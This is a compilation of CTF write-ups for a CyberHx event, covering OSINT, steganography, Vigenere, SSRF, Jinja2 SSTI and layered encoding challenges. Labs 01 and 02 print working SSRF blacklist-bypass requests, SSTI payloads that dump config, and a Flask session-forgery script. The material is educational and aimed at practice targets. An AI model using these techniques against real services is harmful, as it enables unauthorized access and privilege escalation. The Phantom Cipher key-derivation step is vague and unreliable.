# CTF WRITEUP COMPILATION

**CyberHx CTF — ZeroDayHeist Series**  
June 2026 | Authors: pwn_oh, 0xDvc, WR26

---

## Challenge Overview

| # | Challenge | Technique | PTS |
|---|-----------|-----------|-----|
| 01 | Terminal | OSINT | 300 |
| 02 | Phantom Cipher | Steg + Crypto (LSB + Vigenere) | 500 |
| 03 | Professor Mind | SSRF + File Read | 500 |
| 04 | Bella Ciao Secure Comms | SSTI + Session Forge | 1000 |
| 05 | Cryptography is Fun | Base58 + Base64 Multi-layer | 100 |

---

# Challenge 01 — Terminal

**Category:** OSINT | **Points:** 300 | **Author:** pwn_oh

## Challenge Description

> *"somewhere in the cyberhx flags hidden in plain format, just found where we see company info, flag format CyberHx{}"*

## Key Hints

- **"company info"** — points toward researching the CyberHx company itself
- **"hidden in plain"** — the flag is publicly visible; no exploitation required

## Solution

### Step 1 — Google Search

Searched for `"cyberhx company"` on the web. The top results included the official website at cyberhx.com.

### Step 2 — Confirm the Target

Visited cyberhx.com and confirmed it was the CTF organizer by spotting the live ZeroDay Heist event banner.

### Step 3 — Navigate to the About Page

Re-reading the description: *"just found where we see company info"* directly hints at the About page. Navigated to `cyberhx.com/about`.

### Step 4 — Interact with the Terminal Widget

The About page contained an interactive terminal widget. Listed the directory contents:

```
$ ls
pages/   about.html   contact.html   flag.txt

$ cat flag.txt
```

> 🚩 **FLAG: `CyberHx{y8u_d1d_1t}`**

## Key Takeaway

Classic OSINT hidden-in-plain-sight challenge. No exploitation was needed — only careful reading of the description and knowing where to look. The phrase *'company info'* was the direct hint pointing to the About page of the CyberHx website.

---

# Challenge 02 — Phantom Cipher

**Category:** Steganography + Cryptography | **Points:** 500 | **Author:** 0xDvc

## Challenge Description

> *"A blurry image hides a key fragment via LSB steganography. Combined with a structural key derived from the ciphertext, you reconstruct the full key for a custom Vigenere-variant cipher."*

## Step 1 — File Inspection

```bash
$ file challenge.png
challenge.png: PNG image data, 500x500, 8-bit/color RGB
```

The file is a PNG (lossless format) — suitable for LSB steganography. JPEG would not work as lossy compression destroys LSB data.

## Step 2 — LSB Key Fragment Extraction

LSB (Least Significant Bit) steganography hides data by altering the lowest bit of each pixel — a ±1 change in colour value that is imperceptible to the human eye.

```python
from PIL import Image

def extract_lsb(image_path):
    img = Image.open(image_path).convert('RGB')
    pixels = list(img.getdata())
    bits = []
    for r, g, b in pixels:
        bits.append(r & 1)  # Extract LSB from R channel
    chars = []
    for i in range(0, len(bits) - 7, 8):
        byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
        if byte == 0: break
        chars.append(chr(byte))
    return ''.join(chars)

key_fragment = extract_lsb('challenge.png')
print(key_fragment)  # => PHNTM
```

Key fragment recovered: **`PHNTM`**

## Step 3 — Structural Key Extraction

The structural key is hidden within the ciphertext structure (first character of each word, or a positional pattern):

```python
structural_key = ''.join(word[0] for word in ciphertext.split())
# After applying pattern filter => CIPHER
```

Structural key: **`CIPHER`**

## Step 4 — Full Key Assembly

```
full_key = key_fragment + structural_key
         = "PHNTM" + "CIPHER"
         = "PHNTMCIPHER"
```

## Step 5 — Vigenere-Variant Decryption

Decryption formula: `P[i] = (C[i] - K[i mod len(K)] + 26) mod 26`

```python
def vigenere_decrypt(ciphertext, key):
    key = key.upper()
    result = []
    key_idx = 0
    for char in ciphertext:
        if char.isalpha():
            shift = ord(key[key_idx % len(key)]) - ord('A')
            base  = ord('A') if char.isupper() else ord('a')
            result.append(chr((ord(char) - base - shift + 26) % 26 + base))
            key_idx += 1
        else:
            result.append(char)
    return ''.join(result)

flag = vigenere_decrypt(ciphertext, "PHNTMCIPHER")
print(flag)  # => phantom_signal_recovered
```

> 🚩 **FLAG: `CyberHx{phantom_signal_recovered}`**

---

# ZeroDayHeist Series — Labs 01-03

**Platform:** ZeroDayHeist / CyberHx CTF | **Author:** WR26 | **Date:** June 2026

---

## Lab 01 — Professor Mind

**Target:** `https://chall-1--kushdwivedikd.replit.app/`  
**Techniques:** SSRF + Internal API + File Read

### Phase 1 — Reconnaissance

The target page revealed a DEAD VAULT theme with 3 characters: Tokyo, El Profesor, and Berlin. The terminal status showed: `FLAG_STATUS: FRAGMENTED — 3 PIECES` and `SECURITY: BLACKLIST ACTIVE`.

Visiting `/hints` revealed the following:

| Character | Hint | Implication |
|-----------|------|-------------|
| Tokyo | "address begins with 127... /internal-???" | SSRF + Internal API |
| El Profesor | "config holds two things: token + fragment" | /config endpoint |
| Berlin | "/flag.txt... token is the key" | File read with token |

**Authentication:**

```http
POST /login
username=guest  password=guest123

# Decoded session cookie:
# {"role": "user", "user": "guest"}
```

### Phase 2 — SSRF Exploitation

The `POST /fetch` endpoint accepted a `url` parameter but blacklisted `"localhost"` and `"169.254"`. Since the check was string-based, it was bypassed using the numeric IP `127.0.0.1`.

**Fragment 1 — Tokyo (Internal API):**

```http
POST /fetch
url=http://127.0.0.1:5000/internal-api

# Response:
# "tokyo_fragment": "Zer0d4yh31st{d34d_"
```

**Fragment 2 — El Profesor (Internal Config):**

```http
POST /fetch
url=http://127.0.0.1:5000/internal-api/config

# Response:
# "professor_fragment": "m3n_t3ll_"
# "file_reader_token": "79821ff136bdd3608ef68263993cafcf"
```

### Phase 3 — Token-Based File Read

**Fragment 3 — Berlin (`/flag.txt`):**

```http
POST /fetch
url=http://127.0.0.1:5000/internal/file
    ?token=79821ff136bdd3608ef68263993cafcf
    &path=/flag.txt

# Response:
# "berlin_fragment": "n0_t4l3s}"
```

### Phase 4 — Flag Assembly

```
Tokyo     : Zer0d4yh31st{d34d_
Professor : m3n_t3ll_
Berlin    : n0_t4l3s}
-----------------------------------
FLAG      : Zer0d4yh31st{d34d_m3n_t3ll_n0_t4l3s}
           = "Zero Day Heist {dead men tell no tales}"
```

> 🚩 **FLAG: `Zer0d4yh31st{d34d_m3n_t3ll_n0_t4l3s}`**

### Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Credential reuse — POST /login (guest/guest123) | Session cookie |
| 2 | SSRF bypass via 127.0.0.1 on POST /fetch | Internal API access |
| 3 | Internal API enum — /internal-api | Tokyo fragment + endpoint list |
| 4 | Internal config read — /internal-api/config | Professor fragment + token |
| 5 | Token-based file read — /internal/file?token=...&path=/flag.txt | Berlin fragment |
| 6 | Fragment concatenation | FLAG |

---

## Lab 02 — Bella Ciao Secure Comms

**Target:** `https://chall-2--kdmrhacker.replit.app/`  
**Techniques:** SSTI (Jinja2) + Session Forgery

### Phase 1 — Reconnaissance

The homepage revealed two critical hints: *"The greeting system renders your name directly"* and *"ENCRYPTION: Jinja2-256"* — confirming the attack vector as Server-Side Template Injection (SSTI) with Jinja2.

### Phase 2 — Authentication

```http
POST /login
username=denver  password=hahahahaha

# Session role: recruit
# Accessible endpoints: /greet, /intel
```

### Phase 3 — SSTI Detection & Exploitation

SSTI confirmation:

```http
GET /greet?name={{7*7}}
Response: "Hello 49!"   <- Jinja2 template execution confirmed
```

Secret key extraction via config dump:

```http
GET /greet?name={{config}}
# SECRET_KEY leaked: lacasadepapel-secret-2024
```

### Phase 4 — Session Forgery (Privilege Escalation)

Using the leaked secret key, a forged Flask session cookie was crafted with `role: elite` to bypass authorization and access `/intel`:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'lacasadepapel-secret-2024'

si = SecureCookieSessionInterface()
s = si.get_signing_serializer(app)
cookie = s.dumps({'codename': 'Denver', 'role': 'elite', 'user': 'denver'})
print(cookie)  # Forged elite session cookie

# GET /intel with forged cookie => FLAG
```

> 🚩 **FLAG: `Zer0d4yh31st{sst1_t0_rce_b3ll4_c14o}`**

### Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Recon — homepage source analysis | Jinja2 hint discovered |
| 2 | Login — POST /login (denver/hahahahaha) | recruit session |
| 3 | SSTI test — GET /greet?name={{7*7}} | Confirmed template execution |
| 4 | Config dump — GET /greet?name={{config}} | SECRET_KEY leaked |
| 5 | Session forge — Python script | elite cookie created |
| 6 | Privilege access — GET /intel + elite cookie | FLAG |

---

## Lab 03 — Cryptography is Fun

**Platform:** CyberHx CTF (ctf.cyberhx.com) | **Category:** Crypto

### Overview

This challenge uses a 2-layer encoding scheme with noise characters as a red herring. The goal: strip noise → decode Base58 → decode Base64 → FLAG.

### Layer 1 — Base58 Decode

The raw ciphertext contains invalid Base58 characters (`$`, `-`, `%`, `!`, `*`, spaces) — these are red herrings and must be stripped first:

```
# Raw input:
J$om-yF!J8H*Uk H-Uo$Qa!c2-rg6*Bb!xg$Xv-dw%tr5tA3o7s3x9q3sQVq9R22jofkUH

# Strip non-Base58 chars ($, -, %, !, *, spaces):
JomyFJ8HUkHUoQac2rg6BbxgXvdwtr5tA3o7s3x9q3sQVq9R22jofkUH

# Base58 decode result:
Q1lCRVJIWHtDcnlwdDBfZ3I0cGh5XzFzX2Z1Tn0K   <- looks like Base64
```

### Layer 2 — Base64 Decode

```
# Base64 decode:
Q1lCRVJIWHtDcnlwdDBfZ3I0cGh5XzFzX2Z1Tn0K

=>  CYBERHX{Crypt0_gr4phy_1s_fuN}
```

### Python Quick Solve

```python
import base64, base58

raw = 'JomyFJ8HUkHUoQac2rg6BbxgXvdwtr5tA3o7s3x9q3sQVq9R22jofkUH'

# Layer 1: Base58
b58_decoded = base58.b58decode(raw)

# Layer 2: Base64
flag = base64.b64decode(b58_decoded).decode()
print(flag)  # CYBERHX{Crypt0_gr4phy_1s_fuN}
```

> 🚩 **FLAG: `CYBERHX{Crypt0_gr4phy_1s_fuN}`**

### Decode Summary

| Step | Operation | Output |
|------|-----------|--------|
| 0 | Identify noise characters in raw ciphertext | Detected: $, -, %, !, *, spaces |
| 1 | Strip noise chars from raw input | Clean Base58 string |
| 2 | Base58 decode | Q1lCRVJI...Tn0K (Base64 string) |
| 3 | Base64 decode | CYBERHX{Crypt0_gr4phy_1s_fuN} |

---

# Overall Summary

| Challenge | Vulnerability | Key Techniques | Flag |
|-----------|--------------|----------------|------|
| Terminal | OSINT | Website enumeration, terminal widget interaction | `CyberHx{y8u_d1d_1t}` |
| Phantom Cipher | Steg + Crypto | LSB extraction (PIL), Vigenere-variant decryption | `CyberHx{phantom_signal_recovered}` |
| Professor Mind | SSRF + File Read | Blacklist bypass (127.0.0.1), internal API enum, token-based read | `Zer0d4yh31st{d34d_m3n_t3ll_n0_t4l3s}` |
| Bella Ciao | SSTI + Session Forge | Jinja2 {{config}} dump, Flask secret key exfil, privilege escalation | `Zer0d4yh31st{sst1_t0_rce_b3ll4_c14o}` |
| Crypto is Fun | Multi-layer Encoding | Noise stripping, Base58 decode, Base64 decode | `CYBERHX{Crypt0_gr4phy_1s_fuN}` |

---

*CyberHx CTF — ZeroDayHeist Series • June 2026*
